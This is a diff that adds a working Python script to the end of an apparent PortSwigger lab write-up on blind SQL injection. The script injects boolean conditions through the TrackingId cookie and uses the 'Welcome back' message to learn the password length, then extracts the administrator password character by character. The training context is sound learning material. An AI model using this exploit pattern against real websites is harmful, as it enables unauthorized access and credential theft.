@@ -260,3 +260,87 @@ Even though the database results were never displayed directly, the `Welcome bac
 The key technique was converting the blind SQL injection into a series of **true/false questions**, then automating those questions to recover the administrator password.
 
 **Lab status: Solved ✅**
+
+
+
+import requests
+import string
+
+URL = "https://0a3e004e04dfe4e284999af900b000e1.web-security-academy.net/"
+
+SESSION = "An95Lwr2zK0kwpqcLaX2liCwF9VwxA7j"
+TRACKING_ID = "oBG3NJYKvRAYb9NQ"
+
+headers = {
+    "User-Agent": "Mozilla/5.0"
+}
+
+def check(condition):
+    tracking = f"{TRACKING_ID}' AND ({condition})--"
+    
+    cookies = {
+        "TrackingId": tracking,
+        "session": SESSION
+    }
+
+    r = requests.get(
+        URL,
+        headers=headers,
+        cookies=cookies,
+        timeout=10
+    )
+
+    return "Welcome back" in r.text
+
+
+# 1. Encontrar longitud
+print("[*] Buscando longitud...")
+
+length = None
+
+for i in range(1, 31):
+    condition = f"LENGTH((SELECT password FROM users LIMIT 1))={i}"
+
+    if check(condition):
+        length = i
+        print(f"[+] Longitud encontrada: {length}")
+        break
+
+if length is None:
+    print("[-] No se encontró la longitud.")
+    exit()
+
+
+# 2. Extraer contraseña
+print("[*] Extrayendo contraseña...")
+
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+password = ""
+
+for position in range(1, length + 1):
+
+    found = False
+
+    for char in charset:
+
+        condition = (
+            f"SUBSTRING((SELECT password FROM users LIMIT 1),"
+            f"{position},1)='{char}'"
+        )
+
+        if check(condition):
+            password += char
+            print(f"[+] Posición {position}: {char}  ->  {password}")
+            found = True
+            break
+
+    if not found:
+        print(f"[-] No encontramos el carácter {position}")
+        break
+
+
+print()
+print("=" * 40)
+print(f"[+] PASSWORD: {password}")
+print("=" * 40)
